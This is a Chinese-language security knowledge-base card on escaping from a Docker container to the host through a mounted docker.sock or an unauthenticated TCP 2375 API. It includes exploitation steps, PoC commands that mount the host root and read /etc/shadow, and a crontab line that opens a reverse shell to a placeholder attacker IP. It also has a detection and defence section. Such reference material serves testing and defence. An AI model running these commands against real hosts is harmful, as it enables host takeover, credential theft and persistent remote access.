---
id: cloud-container-docker-socket-tcp-escape
title: Docker Socket 挂载或 TCP 2375 暴露导致宿主机逃逸
type: scenario
domain: cloud
path: cloud/container
technique: docker-socket-tcp-escape
tags:
- docker
- container
- escape
- docker-sock
- docker-api
- tcp-2375
- host-mount
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:10:31+08:00'
  notes: 已对照原文与图片33/34/35核对：容器内 /var/run/docker.sock 存在，docker -H unix:///var/run/docker.sock 可用，docker run -it -v /:/host 后读取宿主机 /etc/shadow。TCP 2375 部分来自原文风险章节，curl /version 与 docker -H tcp 利用描述一致。原文未给受影响版本；PoC未本机执行；frontmatter无sources/source_url。
url: /docs/cloud/container/cloud-container-docker-socket-tcp-escape/
draft: false
kb_aliases:
- docker.sock 逃逸
- Docker Socket 挂载
- Docker TCP 2375
- dockerd 未授权
- docker run -v /:/host
---

## 一句话结论

容器内挂载了宿主机的 `/var/run/docker.sock`，或宿主机 `dockerd` 在 TCP 2375 上无认证暴露时，攻击者可在容器内使用 Docker 客户端控制宿主机 Docker，创建挂载宿主机根目录的新容器并 `chroot`，从而获得宿主机 root 权限。

## 原理

- `/var/run/docker.sock` 是 Docker daemon 的 UNIX socket；能访问它的进程等价于拥有宿主机 Docker 控制权（通常等价于 root）。
- 若该 socket 被挂载进容器，攻击者在容器内安装 `docker` CLI 后，通过 `docker -H unix:///var/run/docker.sock` 即可列出/创建/进入宿主机上的容器。
- 攻击者创建 `docker run -it -v /:/host ubuntu /bin/bash`，新容器把宿主机 `/` 挂到 `/host`；在容器内 `chroot /host` 即切换为宿主机 root 文件系统。
- Docker 默认不开启 TCP socket；若配置 `--host tcp://0.0.0.0:2375` 且无 TLS/认证，任何能访问 2375 的人都能直接控制 Docker，效果同上。
- 该逃逸不依赖内核漏洞，是权限/配置错误；需要有容器内命令执行或网络访问 2375。

## 触发条件

- 容器内存在 `/var/run/docker.sock`（通过 `-v /var/run/docker.sock:/var/run/docker.sock` 挂载）。
- 或宿主机 `dockerd` 监听 `0.0.0.0:2375` 且未启用 TLS 客户端认证。
- 攻击者能在容器内安装/上传 Docker CLI，或本机有 Docker CLI 可远程连接。
- 目标 Docker 版本支持 `docker run --privileged/-v` 等操作；无 AppArmor/seccomp 阻断。

## 利用步骤

1. 检测 socket：`ls -lah /var/run/docker.sock`，存在且可读写。
2. 在容器内安装 Docker CLI：`apt-get update && apt-get install -y docker-ce-cli`（或上传静态二进制）。
3. 验证：`docker -H unix:///var/run/docker.sock ps` 列出宿主机容器。
4. 创建挂载宿主机根目录的新容器：`docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu /bin/bash`。
5. 在新容器内 `chroot /host` 或直接读写 `/host/etc/shadow`、`/host/var/spool/cron/`。
6. TCP 场景：`docker -H tcp://TARGET:2375 ps`，后续命令相同；先 `curl http://TARGET:2375/version` 确认。
7. 清理：删除创建的容器/镜像，恢复被修改的宿主机文件。

## PoC

挂载 socket：

```bash
ls -lah /var/run/docker.sock
apt-get update && apt-get install -y docker-ce-cli
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -it -v /:/host ubuntu /bin/bash
# 新容器内：
chroot /host /bin/bash
cat /etc/shadow
```

TCP 2375：

```bash
curl http://TARGET:2375/version
docker -H tcp://TARGET:2375 ps
docker -H tcp://TARGET:2375 run -it -v /:/host ubuntu /bin/bash
```

写入宿主机 crontab（在 `/host` 下）：

```bash
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1' >> /host/etc/crontab
```

## 变体与关联

- 变体：socket 只读挂载时可能无法创建容器，但仍可读取容器信息/镜像/日志中的凭据。
- 变体：Docker API 通过 TLS 2376 暴露但客户端证书校验缺失/可复用，同样可控制。
- 变体：containerd socket（`/run/containerd/containerd.sock`）、CRI-O socket 也可作为等价控制面。
- 变体：`--pid=host`/`--privileged` 容器可直接 `nsenter`，不必走 Docker API（见特权容器卡）。
- 关联：[[cloud-container-docker-privileged-host-disk-escape]]（特权容器挂载磁盘逃逸）。
- 关联：[[cloud-container-docker-procfs-core-pattern-escape]]（procfs core_pattern 逃逸）。
- 关联：[[cloud-container-k8s-workload-config-escape]]（K8s 工作负载配置逃逸）。
- 注意：Docker 组用户等价于 root；不要把 socket 挂载给不可信容器；TCP 2375 绝对不应暴露公网。

## 检测与防御

- 防御：禁止把 `/var/run/docker.sock` 挂载进业务容器；如必须，使用只读代理/受限 API（如 docker-socket-proxy）并做方法白名单。
- 防御：禁止 `dockerd` 监听 TCP 2375；如必须远程管理，启用 TLS 双向认证（2376）并限制来源 IP。
- 防御：严格控制 `docker` 组成员；使用 rootless Docker/用户命名空间；对容器运行时 socket 做文件权限与审计。
- 检测：容器挂载列表含 `docker.sock`/`containerd.sock`；容器内执行 `docker ps/run`；宿主机出现异常新容器、挂载 `/` 的容器；2375 端口对外开放；Docker API 出现 `POST /containers/create` 且 `Binds: ["/:/host"]`。
- 响应：删除异常容器、轮换宿主机凭据、检查 crontab/SSH/账号、审计 Docker 事件日志。
